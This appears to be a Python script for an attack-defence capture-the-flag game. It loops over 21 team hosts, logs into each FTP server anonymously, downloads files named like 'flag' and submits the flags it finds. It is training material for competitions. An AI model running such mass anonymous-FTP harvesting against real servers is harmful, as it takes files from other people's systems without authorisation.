import ftplib
import sys
sys.path.append('.')
from flag_sender import extract_flag, send_flag

N_EQUIPOS = 21
targets = [f'10.66.{i}.4' for i in range(1, N_EQUIPOS + 1)]
port = 21

for ip in targets:
    try:
        print(f"[+] Conectando a {ip}:{port}")
        ftp = ftplib.FTP()
        ftp.connect(ip, port, timeout=3)
        ftp.login("anonymous", "anonymous@")

        archivos = ftp.nlst()
        print(f"    Archivos en {ip}: {archivos}")

        for archivo in archivos:
            if "flag" in archivo.lower():
                with open("tmp_flag.txt", "wb") as f:
                    ftp.retrbinary(f"RETR {archivo}", f.write)

                with open("tmp_flag.txt", "r") as f:
                    contenido = f.read()
                    flag = extract_flag(contenido)
                    if flag:
                        print(f"[+] Flag encontrada en {ip}: {flag}")
                        print(send_flag(flag))
                    else:
                        print(f"[-] No se encontr√≥ flag en {archivo}")

        ftp.quit()
    except Exception as e:
        print(f"[!] Error en {ip}: {e}")
